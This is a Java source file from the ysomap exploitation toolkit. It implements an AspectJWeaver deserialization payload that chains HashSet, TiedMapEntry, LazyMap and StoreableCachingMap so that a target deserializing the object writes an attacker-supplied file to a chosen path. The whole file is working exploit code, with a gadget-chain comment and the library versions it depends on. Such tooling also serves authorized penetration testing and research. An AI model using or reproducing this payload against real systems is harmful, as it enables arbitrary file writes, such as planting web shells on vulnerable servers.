package ysomap.payloads.java.aspectjweaver;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysomap.bullets.Bullet;
import ysomap.bullets.aspectjweaver.StoreableCachingMapBullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;
import ysomap.core.util.FileHelper;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import java.io.FileNotFoundException;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * HashSet.readObject()
 *     HashMap.put()
 *         HashMap.hash()
 *             TiedMapEntry.hashCode()
 *                 TiedMapEntry.getValue()
 *                     LazyMap.get()
 *                         SimpleCache$StorableCachingMap.put()
 *                             SimpleCache$StorableCachingMap.writeToPath()
 *                                 FileOutputStream.write()
 *
 * https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5
 * @author wh1t3p1g
 * @since 2021/7/30
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.JANG })
@Targets({Targets.JDK})
@Require(bullets = {"StoreableCachingMapBullet"},param = false)
@Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
public class AspectJWeaver extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return StoreableCachingMapBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        try {
            byte[] content = FileHelper.getFileContent(bullet.get("localFilepath"));
            String filename = bullet.get("filename");
            Map map = new HashMap();
            map.put(filename, content);
            Transformer transformer = (Transformer)ReflectionHelper
                    .newInstance("org.apache.commons.collections.functors.MapTransformer",
                            new Class[]{Map.class},
                            new Object[]{map});
            Map lazyMap = LazyMap.decorate((Map)obj, transformer);
            TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

            return PayloadHelper.makeHashSetWithEntry(entry);
        }catch (FileNotFoundException e){
            Logger.error(e.getMessage());
        }

        return null;
    }

}
